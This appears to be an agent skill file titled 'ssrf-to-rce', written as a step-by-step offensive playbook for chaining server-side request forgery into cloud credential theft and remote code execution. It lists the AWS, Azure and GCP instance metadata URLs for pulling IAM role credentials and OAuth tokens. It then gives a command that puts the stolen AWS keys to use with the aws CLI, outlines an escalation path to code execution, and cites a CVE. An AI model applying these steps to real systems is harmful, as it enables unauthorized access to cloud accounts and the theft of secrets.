---
name: ssrf-to-rce
description: "SSRF to cloud credentials to RCE chains for AWS, Azure, and GCP IMDS endpoints. Covers metadata pivot, credential extraction, and IAM escalation paths."
---

# ssrf-to-rce — SSRF to Cloud Credentials to RCE

## AWS IMDS Chain
1. Detect SSRF: `http://169.254.169.254/latest/meta-data/`
2. Get role: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Get credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
4. Use credentials: `AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 ls`
5. Escalate via misconfigured IAM → EC2 exec → RCE

## Azure IMDS Chain
1. `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
2. Get token: `http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/`

## GCP IMDS Chain
1. `http://metadata.google.internal/computeMetadata/v1/` (with header `Metadata-Flavor: Google`)
2. Service account token: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`

## CVEs
- CVE-2024-38475 — Apache httpd mod_rewrite SSRF
